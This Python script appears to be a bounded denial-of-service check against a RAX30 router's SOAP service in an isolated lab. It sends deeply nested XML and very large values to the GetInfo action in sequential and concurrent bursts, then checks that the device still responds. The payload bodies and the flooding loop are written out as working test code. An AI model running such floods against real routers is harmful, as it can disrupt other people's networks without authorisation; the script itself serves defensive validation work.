#!/usr/bin/env python3
"""Bounded repeat/concurrency DoS validation for the isolated RAX30 SOAP lab."""

from __future__ import annotations

import statistics
import time
from concurrent.futures import ThreadPoolExecutor

from probe_rax30_soap_security import URN, baseline, raw_request


def timed_baseline() -> tuple[bool, float]:
    started = time.monotonic()
    result = baseline()
    return result, time.monotonic() - started


def send(body: str, action: str = "GetInfo") -> int:
    namespace = f"{URN}:DeviceInfo:1"
    return len(raw_request(f"{namespace}#{action}", body, timeout=3))


def main() -> int:
    cases = {
        "deep_128": "<x>" * 128 + "x" + "</x>" * 128,
        "deep_512": "<x>" * 512 + "x" + "</x>" * 512,
        "value_64k": "<x>" + ("A" * 65_536) + "</x>",
        "value_256k": "<x>" + ("A" * 262_144) + "</x>",
    }
    summary = {}
    for name, body in cases.items():
        sequential = [send(body) for _ in range(25)]
        with ThreadPoolExecutor(max_workers=8) as pool:
            concurrent = list(pool.map(lambda _: send(body), range(40)))
        checks = [timed_baseline() for _ in range(5)]
        alive = all(item[0] for item in checks)
        latencies = [item[1] for item in checks]
        summary[name] = {
            "sequential_requests": len(sequential),
            "concurrent_requests": len(concurrent),
            "responses": sum(1 for size in sequential + concurrent if size > 0),
            "baseline_alive": alive,
            "baseline_latency_max_seconds": max(latencies),
            "baseline_latency_median_seconds": statistics.median(latencies),
        }
        print(f"{name}: {summary[name]}")
        if not alive:
            return 2
    print("persistent_dos_reproduced=false")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
